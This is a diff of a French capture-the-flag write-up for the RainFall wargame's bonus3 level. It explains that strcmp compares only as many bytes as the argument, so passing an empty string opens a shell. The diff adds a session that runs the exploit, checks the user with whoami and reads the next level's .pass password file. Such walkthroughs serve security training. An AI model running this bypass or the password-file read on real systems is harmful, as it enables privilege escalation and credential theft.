@@ -15,6 +15,8 @@ Donc si on mets le bon mot de passe, le programme devrait lancer un shell.
 
 Mais en fait strcmp compare seulement autant de bytes que argv[1] ! Cela aurait pu etre protege en utilisant strncmp plutot, mais ici si on mets un argument vide la condition sera remplie! 
 
-./bonus3 ""
-
+bonus3@RainFall:~$ ./bonus3 ""
+$ whoami
+end
+$ cat /home/user/end/.pass
 cat /home/user/end/.pass
